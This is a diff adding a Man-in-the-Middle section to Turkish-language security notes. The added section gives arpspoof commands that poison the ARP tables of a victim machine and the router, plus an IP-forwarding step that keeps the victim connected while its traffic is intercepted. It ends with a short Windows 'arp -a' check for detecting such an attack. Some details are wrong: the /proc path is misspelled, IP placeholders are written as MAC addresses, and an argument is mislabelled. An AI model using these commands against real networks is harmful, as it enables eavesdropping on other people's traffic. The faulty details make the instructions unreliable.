@@ -21,6 +21,7 @@
   - [Netdiscover](#Netdiscover)
   - [nmap](#nmap)
 - [7-Man in the Middle Saldırısı](#7-Man-in-the-Middle-Saldırısı)
+  - [Windows Bilgisayarımıza MITM Saldırısı Var Mı](#Windows-Bilgisayarımıza-MITM-Saldırısı-Var-Mı)
 
 
 # 1-VPN DNS MAC 
@@ -185,3 +186,21 @@ karşı taraf görebilir
 
 # 7-Man in the Middle Saldırısı
 
+İlk olarak **arpspoof**'u indirmemiz gerekiyor onun için; ```apt install dsniff```
+
+```arpspoof -i eth0 -t XX:XX:XX:XX YY:YY:YY:YY```  target'a kendimizi modem olarak tanıtıyoruz
+
+-t: Kurban IP
+
+YY:YY:YY:YY : Kendi IP adresimiz 
+
+Daha sonra ```arpspoof -i eth0 -t YY:YY:YY:YY XX:XX:XX:XX``` yazarak modem'e kendimizi target olarak tanıtıyoruz
+
+-t: Kendi IP'miz
+XX:XX:XX:XX : Kurban IP
+
+``` echo 1 > /proc/sys/net/ipv4/ip-forward``` IP forwardlamayı etkinleştirerek **hedef pc'nin** ağdan kopmamasını sağlıyoruz
+
+### Windows Bilgisayarımıza MITM Saldırısı Var Mı 
+
+Windows arama yerine ```cmd``` yazarak terminali açıyoruz ve ```arp -a``` yazarak modem ile aynı MAC adresine sahip birisi var mı görüyoruz
